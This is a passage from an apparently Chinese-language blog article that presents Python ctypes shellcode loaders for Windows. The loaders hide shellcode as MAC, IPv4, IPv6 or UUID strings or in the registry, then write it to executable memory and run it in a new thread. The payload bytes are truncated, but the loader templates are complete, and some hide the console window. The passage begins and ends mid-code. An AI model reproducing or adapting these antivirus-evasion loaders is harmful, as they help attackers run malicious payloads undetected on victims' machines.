<span class="n">rwxpage1</span> <span class="o">=</span> <span class="n">rwxpage</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">:</span>
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Rpcrt4</span><span class="o">.</span><span class="n">UuidFromStringA</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">rwxpage1</span><span class="p">)</span>
    <span class="n">rwxpage1</span> <span class="o">+=</span> <span class="mi">16</span>

<span class="n">handle</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">rwxpage</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div>

<p><a name="bafob"></a></p>
<h2>MAC实现内存加载</h2>
<blockquote>
<p>思路：内存加载的一种方式就是去寻找各种API,MSDN上提供了各式各样的API,如果某一种API函数实现了某种可逆的变形并且最终写入到二进制指针当中,那么也就实现了内存加载。</p>
</blockquote>
<p>1、mac shellcode</p>
<div class="highlight"><pre><span></span><code><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="kn">import</span> <span class="nn">ctypes</span>

<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc8\x00</span><span class="s2">...&quot;</span>

<span class="c1"># 如果不能被6整除，就补充剩余的字节</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">%</span> <span class="mi">6</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">replenish_byte</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">6</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">%</span> <span class="mi">6</span><span class="p">)</span>
    <span class="n">buf</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="n">replenish_byte</span>

<span class="c1"># 申请内存</span>
<span class="n">macmem</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">/</span><span class="mi">6</span><span class="o">*</span><span class="mi">17</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">/</span><span class="mi">6</span><span class="p">):</span>
     <span class="n">bytes_a</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">6</span><span class="p">:</span><span class="mi">6</span><span class="o">+</span><span class="n">i</span><span class="o">*</span><span class="mi">6</span><span class="p">]</span>
     <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Ntdll</span><span class="o">.</span><span class="n">RtlEthernetAddressToStringA</span><span class="p">(</span><span class="n">bytes_a</span><span class="p">,</span> <span class="n">macmem</span><span class="o">+</span><span class="n">i</span><span class="o">*</span><span class="mi">17</span><span class="p">)</span>

<span class="c1">#a = ctypes.string_at(macmem, len(buf) * 3 - 1)</span>
<span class="c1">#print(a)</span>

<span class="n">mac</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">/</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">string_at</span><span class="p">(</span><span class="n">macmem</span><span class="o">+</span><span class="n">i</span><span class="o">*</span><span class="mi">17</span><span class="p">,</span><span class="mi">17</span><span class="p">)</span>
    <span class="n">mac</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">mac</span><span class="p">)</span>
</code></pre></div>

<p><img alt="image.png" src="images/1681459181714/1681459188100_19.png"><br />2、python2 加载</p>
<div class="highlight"><pre><span></span><code><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="kn">import</span> <span class="nn">ctypes</span>

<span class="n">mac</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;FC-48-83-E4-F0-E8&#39;</span><span class="p">,</span> <span class="s1">&#39;C8-00-00-00-41-51&#39;</span><span class="p">,</span> <span class="o">...</span><span class="p">]</span>

<span class="n">ptr</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">mac</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>

<span class="c1"># 通过RtlEthernetStringToAddressA函数，将mac值转为二进制写入内存rwxpage是内存指针，表示从该指针位置写入rwxpage+=6是控制指针的位置，每写入一个mac二进制需要将指针移动6个字节</span>
<span class="n">rwxpage</span> <span class="o">=</span> <span class="n">ptr</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">mac</span><span class="p">)):</span>
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Ntdll</span><span class="o">.</span><span class="n">RtlEthernetStringToAddressA</span><span class="p">(</span><span class="n">mac</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">mac</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">rwxpage</span><span class="p">)</span>
    <span class="n">rwxpage</span> <span class="o">+=</span> <span class="mi">6</span>

<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">mac</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">byref</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_long</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span>

<span class="n">handle</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div>

<p>3、ReallocADsMem 合体版</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">ctypes</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xfc\x48\x83</span><span class="s2">......&quot;</span>

<span class="n">macmem</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Activeds</span><span class="o">.</span><span class="n">AllocADsMem</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">/</span><span class="mi">6</span><span class="o">*</span><span class="mi">17</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">/</span><span class="mi">6</span><span class="p">):</span>
     <span class="n">bytes_a</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">6</span><span class="p">:</span><span class="mi">6</span><span class="o">+</span><span class="n">i</span><span class="o">*</span><span class="mi">6</span><span class="p">]</span>
     <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Ntdll</span><span class="o">.</span><span class="n">RtlEthernetAddressToStringA</span><span class="p">(</span><span class="n">bytes_a</span><span class="p">,</span> <span class="n">macmem</span><span class="o">+</span><span class="n">i</span><span class="o">*</span><span class="mi">17</span><span class="p">)</span>
<span class="nb">list</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">/</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">string_at</span><span class="p">(</span><span class="n">macmem</span><span class="o">+</span><span class="n">i</span><span class="o">*</span><span class="mi">17</span><span class="p">,</span><span class="mi">17</span><span class="p">)</span>
    <span class="nb">list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>

<span class="c1"># 第一次申请的内存，存入shellcode</span>
<span class="n">ptr</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Activeds</span><span class="o">.</span><span class="n">AllocADsMem</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nb">list</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span><span class="p">)</span>
<span class="n">rwxpage</span> <span class="o">=</span> <span class="n">ptr</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nb">list</span><span class="p">)):</span>
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Ntdll</span><span class="o">.</span><span class="n">RtlEthernetStringToAddressA</span><span class="p">(</span><span class="nb">list</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="nb">list</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">rwxpage</span><span class="p">)</span>
    <span class="n">rwxpage</span> <span class="o">+=</span> <span class="mi">6</span>

<span class="c1"># 第二次申请内存，复制第一次申请内存的内容。</span>
<span class="n">ptr2</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Activeds</span><span class="o">.</span><span class="n">ReallocADsMem</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="nb">list</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="nb">list</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span><span class="p">)</span>

<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">ptr2</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="nb">list</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">byref</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_long</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span>

<span class="n">handle</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ptr2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div>

<p><a name="tvfeX"></a></p>
<h2>IPV4/IPV6实现内存加载</h2>
<blockquote>
<p>思路：RtlIpv4AddressToStringA函数来将Shellcode转换为ipv4格式，RtlIpv4StringToAddress 函数将 IPv4 地址的字符串表示形式转换为二进制 IPv4 地址。</p>
</blockquote>
<p>1、IPV4 python2代码实现：</p>
<div class="highlight"><pre><span></span><code><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="kn">import</span> <span class="nn">ctypes</span>
<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span>

<span class="c1">#干扰代码</span>
<span class="n">whnd</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">GetConsoleWindow</span><span class="p">()</span>
<span class="k">if</span> <span class="n">whnd</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="k">if</span> <span class="mi">1</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
        <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">user32</span><span class="o">.</span><span class="n">ShowWindow</span><span class="p">(</span><span class="n">whnd</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">whnd</span><span class="p">)</span>


<span class="c1"># 如果不能被4整除，就补充剩余的字节</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">replenish_byte</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">4</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span>
    <span class="n">buf</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="n">replenish_byte</span> 

<span class="n">shellcode</span> <span class="o">=</span> <span class="n">buf</span>

<span class="c1">#申请ipv4虚拟内存</span>
<span class="n">ipv4_address</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">//</span><span class="mi">4</span><span class="o">*</span><span class="mi">16</span><span class="p">),</span><span class="mh">0x3000</span><span class="p">,</span><span class="mh">0x40</span><span class="p">)</span>

<span class="c1">#将tlIpv4AddressToStringA将shellcode转换为ipv4字符串</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">//</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">cut_byte</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">:</span><span class="mi">4</span><span class="o">+</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Ntdll</span><span class="o">.</span><span class="n">RtlIpv4AddressToStringA</span><span class="p">(</span><span class="n">cut_byte</span><span class="p">,</span> <span class="n">ipv4_address</span><span class="o">+</span><span class="n">i</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>

<span class="n">ipv4_list</span> <span class="o">=</span> <span class="p">[]</span>
<span class="c1">#获取IPv4 地址的字符串</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">//</span><span class="mi">4</span><span class="p">):</span>
     <span class="n">ipv4_str</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">string_at</span><span class="p">(</span><span class="n">ipv4_address</span><span class="o">+</span><span class="n">i</span><span class="o">*</span><span class="mi">16</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
     <span class="n">ipv4_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ipv4_str</span><span class="p">)</span>

<span class="c1">#申请shellcode内存</span>
<span class="n">ptr</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
<span class="n">ptr1</span> <span class="o">=</span> <span class="n">ptr</span>

<span class="c1">#RtlIpv4StringToAddressA将ipv4转为二进制写入内存，内存递归增长4</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ipv4_list</span><span class="p">)):</span>     
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Ntdll</span><span class="o">.</span><span class="n">RtlIpv4StringToAddressA</span><span class="p">(</span><span class="n">ipv4_list</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="kc">False</span><span class="p">,</span><span class="n">ipv4_list</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="n">ptr1</span><span class="p">)</span>
    <span class="n">ptr1</span> <span class="o">+=</span> <span class="mi">4</span>

<span class="n">handle</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div>

<p>2、IPV6 python2代码实现：</p>
<div class="highlight"><pre><span></span><code><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="kn">import</span> <span class="nn">ctypes</span>
<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span>

<span class="c1">#干扰代码</span>
<span class="n">whnd</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">GetConsoleWindow</span><span class="p">()</span>
<span class="k">if</span> <span class="n">whnd</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="k">if</span> <span class="mi">1</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
        <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">user32</span><span class="o">.</span><span class="n">ShowWindow</span><span class="p">(</span><span class="n">whnd</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">whnd</span><span class="p">)</span>


<span class="c1"># 如果不能被16整除，就补充剩余的字节</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">replenish_byte</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">16</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span>
    <span class="n">buf</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="n">replenish_byte</span> 

<span class="n">shellcode</span> <span class="o">=</span> <span class="n">buf</span>

<span class="c1">#申请ipv6虚拟内存</span>
<span class="n">ipv6_address</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">//</span><span class="mi">16</span><span class="o">*</span><span class="mi">39</span><span class="p">),</span><span class="mh">0x3000</span><span class="p">,</span><span class="mh">0x40</span><span class="p">)</span>

<span class="c1">#将tlIpv6AddressToStringA将shellcode转换为ipv4字符串</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">//</span><span class="mi">16</span><span class="p">):</span>
    <span class="n">cut_byte</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">16</span><span class="p">:</span><span class="mi">16</span><span class="o">+</span><span class="n">i</span><span class="o">*</span><span class="mi">16</span><span class="p">]</span>
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Ntdll</span><span class="o">.</span><span class="n">RtlIpv6AddressToStringA</span><span class="p">(</span><span class="n">cut_byte</span><span class="p">,</span> <span class="n">ipv6_address</span><span class="o">+</span><span class="n">i</span><span class="o">*</span><span class="mi">39</span><span class="p">)</span>

<span class="n">ipv6_list</span> <span class="o">=</span> <span class="p">[]</span>
<span class="c1">#获取IPv4 地址的字符串</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">//</span><span class="mi">16</span><span class="p">):</span>
     <span class="n">ipv6_str</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">string_at</span><span class="p">(</span><span class="n">ipv6_address</span><span class="o">+</span><span class="n">i</span><span class="o">*</span><span class="mi">39</span><span class="p">,</span><span class="mi">39</span><span class="p">)</span>
     <span class="n">ipv6_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ipv6_str</span><span class="p">)</span>

<span class="c1">#申请shellcode内存</span>
<span class="n">ptr</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">*</span><span class="mi">16</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
<span class="n">ptr1</span> <span class="o">=</span> <span class="n">ptr</span>

<span class="c1">#RtlIpv6StringToAddressA将ip6转为二进制写入内存，内存递归增长16</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ipv6_list</span><span class="p">)):</span>     
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Ntdll</span><span class="o">.</span><span class="n">RtlIpv6StringToAddressA</span><span class="p">(</span><span class="n">ipv6_list</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="s1">&#39;NULL&#39;</span><span class="p">,</span><span class="n">ptr1</span><span class="p">)</span>
    <span class="n">ptr1</span> <span class="o">+=</span> <span class="mi">16</span>

<span class="n">handle</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div>

<p><a name="R0kOS"></a></p>
<h2>注册表实现内存加载</h2>
<blockquote>
<p>思路：先利用<code>RegSetValueExA</code>往<code>HKLM_CURRWNT_USER</code>注册表中写入shellcode，再利用<code>RegQueryValueExA</code>函数是读取注册表中内容的，并存到申请的内存中去执行。</p>
</blockquote>
<p>1、python2/python3 加载代码：</p>
<div class="highlight"><pre><span></span><code><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="kn">import</span> <span class="nn">ctypes</span>
<span class="kn">from</span> <span class="nn">ctypes.wintypes</span> <span class="kn">import</span> <span class="n">DWORD</span>

<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc8\x00</span><span class="s2">...&quot;</span>

<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Advapi32</span><span class="o">.</span><span class="n">RegSetValueExA</span><span class="p">(</span><span class="o">-</span><span class="mi">2147483647</span><span class="p">,</span> <span class="s2">&quot;bypass&quot;</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>

<span class="n">LPBYTE</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">POINTER</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_byte</span><span class="p">)</span>

<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">LPBYTE</span>

<span class="n">ptr</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">800</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>

<span class="n">data_len</span> <span class="o">=</span> <span class="n">DWORD</span><span class="p">()</span>

<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Advapi32</span><span class="o">.</span><span class="n">RegQueryValueExA</span><span class="p">(</span><span class="o">-</span><span class="mi">2147483647</span><span class="p">,</span> <span class="s2">&quot;bypass&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">byref</span><span class="p">(</span><span class="n">data_len</span><span class="p">))</span>
